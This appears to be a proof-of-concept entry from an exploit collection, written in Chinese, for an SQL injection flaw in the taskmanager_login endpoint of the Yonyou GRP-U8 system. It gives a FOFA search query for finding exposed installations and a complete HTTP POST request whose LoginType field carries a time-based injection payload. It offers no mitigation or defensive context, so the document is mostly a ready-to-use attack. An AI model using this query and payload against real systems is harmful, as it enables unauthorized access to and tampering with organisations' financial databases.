# 用友GRP-U8系统taskmanager_login存在SQL注入漏洞

用友GRP-U8系统taskmanager_login存在SQL注入漏洞

## fofa

```javascript
app="用友-GRP-U8"
```

## poc

```javascript
POST /TaskManager/taskmanager_login HTTP/1.1
Host: 192.168.57.141:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=6D291F1355C003C0237B76758924D087
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Content-Length: 94

UserNameText=%CF%B5%CD%B3%B9%DC%C0%ED%D4%B1&UserPassText=abc&LoginType=;WAITFOR DELAY '0:0:5'--&submitAction=login
```

